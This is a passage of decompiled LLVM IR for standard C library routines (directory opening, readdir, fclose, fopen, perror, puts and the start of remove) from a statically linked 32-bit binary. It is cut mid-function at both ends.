  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805a66c = load i32, i32* @edi, align 4
  %v0_805a66d = load i32, i32* @esi, align 4
  %v0_805a66e = load i32, i32* @ebx, align 4
  store i32 %v0_805a66e, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v4_805a67d = call i32 @__libc_open(i32 %arg1, i8 0, i32 %tmp10)
  store i32 %v4_805a67d, i32* %eax.global-to-local, align 4
  %v2_805a687 = icmp slt i32 %v4_805a67d, 0
  br i1 %v2_805a687, label %dec_label_pc_805a754, label %dec_label_pc_805a68f

dec_label_pc_805a68f:                             ; preds = %entry
  %v0_805a68f = load i32, i32* @ebx, align 4
  %v2_805a691 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_805a691, i32* %eax.global-to-local, align 4
  store i32 %v4_805a67d, i32* %stack_var_-124, align 4
  %v4_805a697 = call i32 @fstat(i32 %v4_805a67d, i32 %v2_805a691, i32 %v0_805a68f, i32 %v0_805a68f)
  store i32 %v4_805a697, i32* %eax.global-to-local, align 4
  %v2_805a69f = icmp slt i32 %v4_805a697, 0
  br i1 %v2_805a69f, label %dec_label_pc_805a6b5, label %dec_label_pc_805a6a3

dec_label_pc_805a6a3:                             ; preds = %dec_label_pc_805a68f
  %v0_805a6a8 = load i32, i32* @edi, align 4
  store i32 %v0_805a6a8, i32* %stack_var_-124, align 4
  %v3_805a6a9 = call i32 @__libc_fcntl(i32 %v0_805a6a8, i32 2, i32 1)
  store i32 %v3_805a6a9, i32* %eax.global-to-local, align 4
  %v2_805a6b1 = icmp slt i32 %v3_805a6a9, 0
  %v1_805a6b3 = icmp eq i1 %v2_805a6b1, false
  br i1 %v1_805a6b3, label %dec_label_pc_805a6cb, label %dec_label_pc_805a6b5

dec_label_pc_805a6b5:                             ; preds = %dec_label_pc_805a6a3, %dec_label_pc_805a68f
  %v0_805a6b5 = load i32, i32* %stack_var_-124, align 4
  %v1_805a6b5 = call i32 @__errno_location(i32 %v0_805a6b5)
  store i32 %v1_805a6b5, i32* %eax.global-to-local, align 4
  store i32 %v1_805a6b5, i32* @ebx, align 4
  %v1_805a6bf = inttoptr i32 %v1_805a6b5 to i32*
  %v2_805a6bf = load i32, i32* %v1_805a6bf, align 4
  store i32 %v2_805a6bf, i32* @esi, align 4
  %v0_805a6c1 = load i32, i32* @edi, align 4
  store i32 %v0_805a6c1, i32* %stack_var_-124, align 4
  %v1_805a6c2 = call i32 @__libc_close(i32 %v0_805a6c1)
  store i32 %v1_805a6c2, i32* %eax.global-to-local, align 4
  %v0_805a6c7 = load i32, i32* @esi, align 4
  %v1_805a6c7 = load i32, i32* @ebx, align 4
  %v2_805a6c7 = inttoptr i32 %v1_805a6c7 to i32*
  store i32 %v0_805a6c7, i32* %v2_805a6c7, align 4
  br label %dec_label_pc_805a740

dec_label_pc_805a6cb:                             ; preds = %dec_label_pc_805a6a3
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805a6d0 = call i32 @malloc(i32 48)
  store i32 %v1_805a6d0, i32* %eax.global-to-local, align 4
  store i32 %v1_805a6d0, i32* @ebx, align 4
  %v1_805a6da = icmp eq i32 %v1_805a6d0, 0
  br i1 %v1_805a6da, label %dec_label_pc_805a72c, label %dec_label_pc_805a6de

dec_label_pc_805a6de:                             ; preds = %dec_label_pc_805a6cb
  %v0_805a6de = load i32, i32* @edi, align 4
  %v2_805a6de = inttoptr i32 %v1_805a6d0 to i32*
  store i32 %v0_805a6de, i32* %v2_805a6de, align 4
  %v1_805a6e0 = add i32 %v1_805a6d0, 16
  %v2_805a6e0 = inttoptr i32 %v1_805a6e0 to i32*
  store i32 0, i32* %v2_805a6e0, align 4
  %v1_805a6e7 = add i32 %v1_805a6d0, 8
  %v2_805a6e7 = inttoptr i32 %v1_805a6e7 to i32*
  store i32 0, i32* %v2_805a6e7, align 4
  %v1_805a6ee = add i32 %v1_805a6d0, 4
  %v2_805a6ee = inttoptr i32 %v1_805a6ee to i32*
  store i32 0, i32* %v2_805a6ee, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_805a6f9 = load i32, i32* @ebx, align 4
  %v2_805a6f9 = add i32 %v1_805a6f9, 20
  %v3_805a6f9 = inttoptr i32 %v2_805a6f9 to i32*
  store i32 %tmp, i32* %v3_805a6f9, align 4
  %v0_805a6fc = load i32, i32* %eax.global-to-local, align 4
  %v6_805a701 = icmp ugt i32 %v0_805a6fc, 511
  br i1 %v6_805a701, label %dec_label_pc_805a70a, label %dec_label_pc_805a703

dec_label_pc_805a703:                             ; preds = %dec_label_pc_805a6de
  %v0_805a703 = load i32, i32* @ebx, align 4
  %v1_805a703 = add i32 %v0_805a703, 20
  %v2_805a703 = inttoptr i32 %v1_805a703 to i32*
  store i32 512, i32* %v2_805a703, align 4
  br label %dec_label_pc_805a70a

dec_label_pc_805a70a:                             ; preds = %dec_label_pc_805a6de, %dec_label_pc_805a703
  %v0_805a70c = load i32, i32* @ebx, align 4
  %v1_805a70c = add i32 %v0_805a70c, 20
  %v2_805a70c = inttoptr i32 %v1_805a70c to i32*
  %v3_805a70c = load i32, i32* %v2_805a70c, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_805a711 = call i32 @calloc(i64 1, i32 %v3_805a70c)
  store i32 %v3_805a711, i32* %eax.global-to-local, align 4
  %v1_805a719 = load i32, i32* @ebx, align 4
  %v2_805a719 = add i32 %v1_805a719, 12
  %v3_805a719 = inttoptr i32 %v2_805a719 to i32*
  store i32 %v3_805a711, i32* %v3_805a719, align 4
  %v1_805a71c = icmp eq i32 %v3_805a711, 0
  %v1_805a71e = icmp eq i1 %v1_805a71c, false
  br i1 %v1_805a71e, label %dec_label_pc_805a744, label %dec_label_pc_805a720

dec_label_pc_805a720:                             ; preds = %dec_label_pc_805a70a
  %v0_805a723 = load i32, i32* @ebx, align 4
  store i32 %v0_805a723, i32* %stack_var_-124, align 4
  %v1_805a724 = call i32 @free(i32 %v0_805a723)
  store i32 %v1_805a724, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a72c

dec_label_pc_805a72c:                             ; preds = %dec_label_pc_805a6cb, %dec_label_pc_805a720
  %v0_805a72f = load i32, i32* @edi, align 4
  store i32 %v0_805a72f, i32* %stack_var_-124, align 4
  %v1_805a730 = call i32 @__libc_close(i32 %v0_805a72f)
  store i32 %v1_805a730, i32* %eax.global-to-local, align 4
  %v1_805a735 = call i32 @__errno_location(i32 %v0_805a72f)
  store i32 %v1_805a735, i32* %eax.global-to-local, align 4
  %v1_805a73a = inttoptr i32 %v1_805a735 to i32*
  store i32 12, i32* %v1_805a73a, align 4
  br label %dec_label_pc_805a740

dec_label_pc_805a740:                             ; preds = %dec_label_pc_805a6b5, %dec_label_pc_805a72c
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805a751

dec_label_pc_805a744:                             ; preds = %dec_label_pc_805a70a
  %v0_805a746 = load i32, i32* @ebx, align 4
  %v1_805a746 = add i32 %v0_805a746, 24
  store i32 %v1_805a746, i32* %eax.global-to-local, align 4
  store i32 %v1_805a746, i32* %stack_var_-124, align 4
  %v3_805a74c = call i32 @pthread_mutex_init(i32 %v1_805a746, i32* null)
  store i32 %v3_805a74c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a751

dec_label_pc_805a751:                             ; preds = %dec_label_pc_805a740, %dec_label_pc_805a744
  br label %dec_label_pc_805a754

dec_label_pc_805a754:                             ; preds = %entry, %dec_label_pc_805a751
  %v0_805a757 = load i32, i32* @ebx, align 4
  store i32 %v0_805a757, i32* %eax.global-to-local, align 4
  %v2_805a759 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a759, i32* @ebx, align 4
  store i32 %v0_805a66d, i32* @esi, align 4
  store i32 %v0_805a66c, i32* @edi, align 4
  ret i32 %v0_805a757

; uselistorder directives
  uselistorder i32 %v3_805a711, { 1, 0, 2 }
  uselistorder i32 %v1_805a6d0, { 0, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_805a6b5, { 1, 0, 2 }
  uselistorder i32 %v4_805a67d, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 511, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a754, { 1, 0 }
  uselistorder label %dec_label_pc_805a751, { 1, 0 }
  uselistorder label %dec_label_pc_805a740, { 1, 0 }
  uselistorder label %dec_label_pc_805a72c, { 1, 0 }
  uselistorder label %dec_label_pc_805a70a, { 1, 0 }
}

define i32 @__GI_readdir() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805a760 = load i32, i32* @esi, align 4
  %v0_805a761 = load i32, i32* @ebx, align 4
  store i32 %v0_805a761, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805a769 = add i32 %tmp, 24
  store i32 %v1_805a769, i32* @ebx, align 4
  %v4_805a777 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 %v1_805a769)
  %v0_805a77c = load i32, i32* @ebx, align 4
  %v1_805a77f = call i32 @pthread_mutex_lock(i32 %v0_805a77c)
  br label %dec_label_pc_805a787

dec_label_pc_805a787:                             ; preds = %dec_label_pc_805a7b2, %entry
  %v0_805a787 = load i32, i32* @esi, align 4
  %v1_805a787 = add i32 %v0_805a787, 8
  %v2_805a787 = inttoptr i32 %v1_805a787 to i32*
  %v3_805a787 = load i32, i32* %v2_805a787, align 4
  %v2_805a78a = add i32 %v0_805a787, 4
  %v3_805a78a = inttoptr i32 %v2_805a78a to i32*
  %v4_805a78a = load i32, i32* %v3_805a78a, align 4
  %v6_805a78d = icmp ugt i32 %v3_805a787, %v4_805a78a
  br i1 %v6_805a78d, label %dec_label_pc_805a7b2, label %dec_label_pc_805a78f

dec_label_pc_805a78f:                             ; preds = %dec_label_pc_805a787
  %v0_805a78f = load i32, i32* @edx, align 4
  %v1_805a790 = add i32 %v0_805a787, 20
  %v2_805a790 = inttoptr i32 %v1_805a790 to i32*
  %v3_805a790 = load i32, i32* %v2_805a790, align 4
  %v1_805a793 = add i32 %v0_805a787, 12
  %v2_805a793 = inttoptr i32 %v1_805a793 to i32*
  %v3_805a793 = load i32, i32* %v2_805a793, align 4
  %v1_805a796 = inttoptr i32 %v0_805a787 to i32*
  %v2_805a796 = load i32, i32* %v1_805a796, align 4
  %v4_805a798 = call i32 @__getdents(i32 %v2_805a796, i32 %v3_805a793, i32 %v3_805a790, i32 %v0_805a78f)
  %tmp12 = icmp slt i32 %v4_805a798, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805a7a8, label %dec_label_pc_805a7a4

dec_label_pc_805a7a4:                             ; preds = %dec_label_pc_805a78f
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805a7ce

dec_label_pc_805a7a8:                             ; preds = %dec_label_pc_805a78f
  %v1_805a7a8 = load i32, i32* @esi, align 4
  %v2_805a7a8 = add i32 %v1_805a7a8, 8
  %v3_805a7a8 = inttoptr i32 %v2_805a7a8 to i32*
  store i32 %v4_805a798, i32* %v3_805a7a8, align 4
  %v0_805a7ab = load i32, i32* @esi, align 4
  %v1_805a7ab = add i32 %v0_805a7ab, 4
  %v2_805a7ab = inttoptr i32 %v1_805a7ab to i32*
  store i32 0, i32* %v2_805a7ab, align 4
  %v0_805a7b2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a7b2

dec_label_pc_805a7b2:                             ; preds = %dec_label_pc_805a787, %dec_label_pc_805a7a8
  %v1_805a7c0 = phi i32 [ %v0_805a787, %dec_label_pc_805a787 ], [ %v0_805a7b2.pre, %dec_label_pc_805a7a8 ]
  %v1_805a7b2 = add i32 %v1_805a7c0, 4
  %v2_805a7b2 = inttoptr i32 %v1_805a7b2 to i32*
  %v3_805a7b2 = load i32, i32* %v2_805a7b2, align 4
  %v2_805a7b7 = add i32 %v1_805a7c0, 12
  %v3_805a7b7 = inttoptr i32 %v2_805a7b7 to i32*
  %v4_805a7b7 = load i32, i32* %v3_805a7b7, align 4
  %v5_805a7b7 = add i32 %v4_805a7b7, %v3_805a7b2
  store i32 %v5_805a7b7, i32* @ebx, align 4
  %v1_805a7ba = add i32 %v5_805a7b7, 8
  %v2_805a7ba = inttoptr i32 %v1_805a7ba to i16*
  %v3_805a7ba = load i16, i16* %v2_805a7ba, align 2
  %v4_805a7ba = zext i16 %v3_805a7ba to i32
  store i32 %v4_805a7ba, i32* @edx, align 4
  %v2_805a7be = add i32 %v4_805a7ba, %v3_805a7b2
  store i32 %v2_805a7be, i32* %v2_805a7b2, align 4
  %v0_805a7c3 = load i32, i32* @ebx, align 4
  %v1_805a7c3 = add i32 %v0_805a7c3, 4
  %v2_805a7c3 = inttoptr i32 %v1_805a7c3 to i32*
  %v3_805a7c3 = load i32, i32* %v2_805a7c3, align 4
  %v1_805a7c6 = load i32, i32* @esi, align 4
  %v2_805a7c6 = add i32 %v1_805a7c6, 16
  %v3_805a7c6 = inttoptr i32 %v2_805a7c6 to i32*
  store i32 %v3_805a7c3, i32* %v3_805a7c6, align 4
  %v0_805a7c9 = load i32, i32* @ebx, align 4
  %v1_805a7c9 = inttoptr i32 %v0_805a7c9 to i32*
  %v2_805a7c9 = load i32, i32* %v1_805a7c9, align 4
  %v3_805a7c9 = icmp eq i32 %v2_805a7c9, 0
  br i1 %v3_805a7c9, label %dec_label_pc_805a787, label %dec_label_pc_805a7ce.loopexit

dec_label_pc_805a7ce.loopexit:                    ; preds = %dec_label_pc_805a7b2
  br label %dec_label_pc_805a7ce

dec_label_pc_805a7ce:                             ; preds = %dec_label_pc_805a7ce.loopexit, %dec_label_pc_805a7a4
  %v3_805a7d7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_805a7dc = load i32, i32* @ebx, align 4
  %v2_805a7e1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a7e1, i32* @ebx, align 4
  store i32 %v0_805a760, i32* @esi, align 4
  ret i32 %v0_805a7dc

; uselistorder directives
  uselistorder i32 %v1_805a7c0, { 1, 0 }
  uselistorder i32 %v4_805a798, { 1, 0 }
  uselistorder i32 %v0_805a787, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805a7b2, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805a7e4 = load i32, i32* @ebp, align 4
  %v0_805a7e5 = load i32, i32* @edi, align 4
  %v0_805a7e6 = load i32, i32* @esi, align 4
  %v0_805a7e7 = load i32, i32* @ebx, align 4
  %v4_805a7eb = ptrtoint i16* %arg1 to i32
  store i32 %v4_805a7eb, i32* @esi, align 4
  %v1_805a7ef = add i32 %v4_805a7eb, 52
  %v2_805a7ef = inttoptr i32 %v1_805a7ef to i32*
  %v3_805a7ef = load i32, i32* %v2_805a7ef, align 4
  store i32 %v3_805a7ef, i32* @ebp, align 4
  %v1_805a7f2 = icmp eq i32 %v3_805a7ef, 0
  %v1_805a7f4 = icmp eq i1 %v1_805a7f2, false
  br i1 %v1_805a7f4, label %dec_label_pc_805a815, label %dec_label_pc_805a7f6

dec_label_pc_805a7f6:                             ; preds = %entry
  %v1_805a7f6 = add i32 %v4_805a7eb, 56
  store i32 %v1_805a7f6, i32* @ebx, align 4
  %v4_805a805 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 %v1_805a7f6)
  %v0_805a80a = load i32, i32* @ebx, align 4
  %v1_805a80d = call i32 @pthread_mutex_lock(i32 %v0_805a80a)
  %v0_805a817.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a815

dec_label_pc_805a815:                             ; preds = %entry, %dec_label_pc_805a7f6
  %v0_805a81f = phi i32 [ %v4_805a7eb, %entry ], [ %v0_805a817.pre, %dec_label_pc_805a7f6 ]
  store i32 0, i32* @edi, align 4
  %v1_805a817 = inttoptr i32 %v0_805a81f to i8*
  %v2_805a817 = load i8, i8* %v1_805a817, align 1
  %v3_805a817 = and i8 %v2_805a817, 64
  %v4_805a817 = icmp eq i8 %v3_805a817, 0
  br i1 %v4_805a817, label %dec_label_pc_805a815.dec_label_pc_805a82a_crit_edge, label %dec_label_pc_805a81c

dec_label_pc_805a815.dec_label_pc_805a82a_crit_edge: ; preds = %dec_label_pc_805a815
  br label %dec_label_pc_805a82a

dec_label_pc_805a81c:                             ; preds = %dec_label_pc_805a815
  %v1_805a820 = inttoptr i32 %v0_805a81f to i16*
  %v2_805a820 = call i32 @fflush_unlocked(i16* %v1_805a820)
  store i32 %v2_805a820, i32* @edi, align 4
  %v0_805a82d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a82a

dec_label_pc_805a82a:                             ; preds = %dec_label_pc_805a815.dec_label_pc_805a82a_crit_edge, %dec_label_pc_805a81c
  %v0_805a82d = phi i32 [ %v0_805a81f, %dec_label_pc_805a815.dec_label_pc_805a82a_crit_edge ], [ %v0_805a82d.pre, %dec_label_pc_805a81c ]
  %v1_805a82d = add i32 %v0_805a82d, 4
  %v2_805a82d = inttoptr i32 %v1_805a82d to i32*
  %v3_805a82d = load i32, i32* %v2_805a82d, align 4
  %v1_805a830 = call i32 @__libc_close(i32 %v3_805a82d)
  %v2_805a838 = icmp slt i32 %v1_805a830, 0
  %v1_805a83a = icmp eq i1 %v2_805a838, false
  br i1 %v1_805a83a, label %dec_label_pc_805a83f, label %dec_label_pc_805a83c

dec_label_pc_805a83c:                             ; preds = %dec_label_pc_805a82a
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805a83f

dec_label_pc_805a83f:                             ; preds = %dec_label_pc_805a82a, %dec_label_pc_805a83c
  %v0_805a83f = load i32, i32* @esi, align 4
  %v1_805a83f = add i32 %v0_805a83f, 4
  %v2_805a83f = inttoptr i32 %v1_805a83f to i32*
  store i32 -1, i32* %v2_805a83f, align 4
  %v2_805a851 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805a851, i32* @ebx, align 4
  %v4_805a856 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134583465, i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v1_805a862 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v0_805a867 = load i32, i32* @global_var_807a688.719, align 8
  %v1_805a86c = add i32 %v0_805a867, 1
  store i32 %v1_805a86c, i32* @global_var_807a688.719, align 8
  %v3_805a877 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805a87f = load i32, i32* @esi, align 4
  %v1_805a87f = inttoptr i32 %v0_805a87f to i16*
  %v2_805a87f = load i16, i16* %v1_805a87f, align 2
  %v3_805a87f = and i16 %v2_805a87f, 24576
  store i16 %v3_805a87f, i16* %v1_805a87f, align 2
  %v0_805a884 = load i32, i32* @esi, align 4
  %v1_805a884 = inttoptr i32 %v0_805a884 to i16*
  %v2_805a884 = load i16, i16* %v1_805a884, align 2
  %v3_805a884 = or i16 %v2_805a884, 48
  store i16 %v3_805a884, i16* %v1_805a884, align 2
  br i1 %v1_805a7f4, label %dec_label_pc_805a89d, label %dec_label_pc_805a88c

dec_label_pc_805a88c:                             ; preds = %dec_label_pc_805a83f
  %v3_805a895 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805a89d

dec_label_pc_805a89d:                             ; preds = %dec_label_pc_805a83f, %dec_label_pc_805a88c
  %v0_805a89d = load i32, i32* @esi, align 4
  %v1_805a89d = add i32 %v0_805a89d, 1
  %v2_805a89d = inttoptr i32 %v1_805a89d to i8*
  %v3_805a89d = load i8, i8* %v2_805a89d, align 1
  %v4_805a89d = and i8 %v3_805a89d, 64
  %v5_805a89d = icmp eq i8 %v4_805a89d, 0
  br i1 %v5_805a89d, label %dec_label_pc_805a8b1, label %dec_label_pc_805a8a3

dec_label_pc_805a8a3:                             ; preds = %dec_label_pc_805a89d
  %v1_805a8a6 = add i32 %v0_805a89d, 8
  %v2_805a8a6 = inttoptr i32 %v1_805a8a6 to i32*
  %v3_805a8a6 = load i32, i32* %v2_805a8a6, align 4
  %v1_805a8a9 = call i32 @free(i32 %v3_805a8a6)
  br label %dec_label_pc_805a8b1

dec_label_pc_805a8b1:                             ; preds = %dec_label_pc_805a89d, %dec_label_pc_805a8a3
  %v4_805a8bd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134583465, i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v1_805a8c9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v0_805a8d0 = load i32, i32* @global_var_807a68c.720, align 4
  %v1_805a8d0 = add i32 %v0_805a8d0, 1
  store i32 %v1_805a8d0, i32* @global_var_807a68c.720, align 4
  %v3_805a8d9 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805a8de = call i32 @_stdio_openlist_dec_use()
  %v0_805a8e6 = load i32, i32* @edi, align 4
  store i32 %v0_805a7e7, i32* @ebx, align 4
  store i32 %v0_805a7e6, i32* @esi, align 4
  store i32 %v0_805a7e5, i32* @edi, align 4
  store i32 %v0_805a7e4, i32* @ebp, align 4
  ret i32 %v0_805a8e6

; uselistorder directives
  uselistorder label %dec_label_pc_805a8b1, { 1, 0 }
  uselistorder label %dec_label_pc_805a89d, { 1, 0 }
  uselistorder label %dec_label_pc_805a83f, { 1, 0 }
  uselistorder label %dec_label_pc_805a82a, { 1, 0 }
  uselistorder label %dec_label_pc_805a815, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805a8ff = inttoptr i32 %arg2 to i8*
  %v5_805a8ff = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805a8ff, i32 0, i32 -1)
  ret i32 %v5_805a8ff
}

define i32 @perror(i8* %arg1) local_unnamed_addr {
entry:
  %v1_805a90f = icmp eq i8* %arg1, null
  br i1 %v1_805a90f, label %dec_label_pc_805a91d, label %dec_label_pc_805a913

dec_label_pc_805a913:                             ; preds = %entry
  %v4_805a90b = ptrtoint i8* %arg1 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_806e857.721 to i32), i32* @edx, align 4
  %v2_805a918 = load i8, i8* %arg1, align 1
  %v3_805a918 = icmp eq i8 %v2_805a918, 0
  %v1_805a91b = icmp eq i1 %v3_805a918, false
  br i1 %v1_805a91b, label %dec_label_pc_805a924, label %dec_label_pc_805a91d

dec_label_pc_805a91d:                             ; preds = %dec_label_pc_805a913, %entry
  store i32 ptrtoint (i32* @global_var_806e859.722 to i32), i32* @edx, align 4
  br label %dec_label_pc_805a924

dec_label_pc_805a924:                             ; preds = %dec_label_pc_805a913, %dec_label_pc_805a91d
  %v0_805a925 = phi i32 [ %v4_805a90b, %dec_label_pc_805a913 ], [ ptrtoint (i32* @global_var_806e859.722 to i32), %dec_label_pc_805a91d ]
  %v0_805a92b2 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_805a931 = call i32 @fprintf(i32 %v0_805a92b2, i32 ptrtoint ([8 x i8]* @global_var_806cba0.723 to i32), i32 %v0_805a925)
  ret i32 %v5_805a931

; uselistorder directives
  uselistorder label %dec_label_pc_805a924, { 1, 0 }
}

define i32 @puts(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805a93c = load i32, i32* @edi, align 4
  %v0_805a93d = load i32, i32* @esi, align 4
  %v0_805a93e = load i32, i32* @ebx, align 4
  %v0_805a942 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_805a942 = ptrtoint i8* %v0_805a942 to i32
  store i32 %v1_805a942, i32* @esi, align 4
  %v1_805a948 = add i32 %v1_805a942, 52
  %v2_805a948 = inttoptr i32 %v1_805a948 to i32*
  %v3_805a948 = load i32, i32* %v2_805a948, align 4
  store i32 %v3_805a948, i32* @edi, align 4
  %v1_805a94b = icmp eq i32 %v3_805a948, 0
  %v1_805a94d = icmp eq i1 %v1_805a94b, false
  br i1 %v1_805a94d, label %entry.dec_label_pc_805a96e_crit_edge, label %dec_label_pc_805a94f

entry.dec_label_pc_805a96e_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805a96e

dec_label_pc_805a94f:                             ; preds = %entry
  %v1_805a94f = add i32 %v1_805a942, 56
  store i32 %v1_805a94f, i32* @ebx, align 4
  %v5_805a95e = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805a94f)
  %v0_805a963 = load i32, i32* @ebx, align 4
  %v1_805a966 = call i32 @pthread_mutex_lock(i32 %v0_805a963)
  %v0_805a970.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a96e

dec_label_pc_805a96e:                             ; preds = %entry.dec_label_pc_805a96e_crit_edge, %dec_label_pc_805a94f
  %v0_805a970 = phi i32 [ %v1_805a942, %entry.dec_label_pc_805a96e_crit_edge ], [ %v0_805a970.pre, %dec_label_pc_805a94f ]
  %v0_805a96e = load i32, i32* @ecx, align 4
  %v5_805a975 = inttoptr i32 %arg1 to i8*
  %v6_805a975 = call i32 @__GI_fputs_unlocked(i8* %v5_805a975, i32 %v0_805a970, i32 %v0_805a96e, i32 %v0_805a96e)
  store i32 %v6_805a975, i32* @ebx, align 4
  %v10_805a97f = icmp eq i32 %v6_805a975, -1
  br i1 %v10_805a97f, label %dec_label_pc_805a99a, label %dec_label_pc_805a984

dec_label_pc_805a984:                             ; preds = %dec_label_pc_805a96e
  %v0_805a986 = load i32, i32* @esi, align 4
  %v4_805a989 = call i32 @putc_unlocked(i8 10, i32 %v0_805a986)
  %v8_805a991 = icmp eq i32 %v4_805a989, -1
  %v1_805a992 = icmp eq i1 %v8_805a991, false
  br i1 %v1_805a992, label %dec_label_pc_805a999, label %dec_label_pc_805a994

dec_label_pc_805a994:                             ; preds = %dec_label_pc_805a984
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_805a99a

dec_label_pc_805a999:                             ; preds = %dec_label_pc_805a984
  %v0_805a999 = load i32, i32* @ebx, align 4
  %v1_805a999 = add i32 %v0_805a999, 1
  store i32 %v1_805a999, i32* @ebx, align 4
  br label %dec_label_pc_805a99a

dec_label_pc_805a99a:                             ; preds = %dec_label_pc_805a96e, %dec_label_pc_805a994, %dec_label_pc_805a999
  %v0_805a9b27 = phi i32 [ %v6_805a975, %dec_label_pc_805a96e ], [ -1, %dec_label_pc_805a994 ], [ %v1_805a999, %dec_label_pc_805a999 ]
  br i1 %v1_805a94d, label %dec_label_pc_805a9af, label %dec_label_pc_805a99e

dec_label_pc_805a99e:                             ; preds = %dec_label_pc_805a99a
  %v4_805a9a7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805a9b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a9af

dec_label_pc_805a9af:                             ; preds = %dec_label_pc_805a99a, %dec_label_pc_805a99e
  %v0_805a9b2 = phi i32 [ %v0_805a9b27, %dec_label_pc_805a99a ], [ %v0_805a9b2.pre, %dec_label_pc_805a99e ]
  store i32 %v0_805a93e, i32* @ebx, align 4
  store i32 %v0_805a93d, i32* @esi, align 4
  store i32 %v0_805a93c, i32* @edi, align 4
  ret i32 %v0_805a9b2

; uselistorder directives
  uselistorder i32 %v6_805a975, { 1, 0, 2 }
  uselistorder i8** @global_var_8073d6c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805a9af, { 1, 0 }
  uselistorder label %dec_label_pc_805a99a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a96e, { 1, 0 }
}

define i32 @remove() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805a9b8 = load i32, i32* @edi, align 4
  %v0_805a9b9 = load i32, i32* @esi, align 4
  %v0_805a9ba = load i32, i32* @ebx, align 4
  store i32 %v0_805a9ba, i32* %stack_var_-12, align 4
  %v1_805a9bb = call i32 @__errno_location(i32 %v0_805a9ba)
  store i32 %tmp, i32* %esi.global-to-local, align 4
  %v1_805a9c7 = inttoptr i32 %v1_805a9bb to i32*
  %v2_805a9c7 = load i32, i32* %v1_805a9c7, align 4
  store i32 %v2_805a9c7, i32* @edi, align 4
  store i32 %v1_805a9bb, i32* @ebx, align 4
  %v1_805a9cc = call i32 @rmdir(i32 %tmp)
  %v2_805a9d4 = icmp slt i32 %v1_805a9cc, 0
  %v1_805a9d6 = icmp eq i1 %v2_805a9d4, false
  br i1 %v1_805a9d6, label %dec_label_pc_805a9eb, label %dec_label_pc_805a9d8

dec_label_pc_805a9d8:                             ; preds = %entry
  %v0_805a9d8 = load i32, i32* @ebx, align 4
  %v1_805a9d8 = inttoptr i32 %v0_805a9d8 to i32*
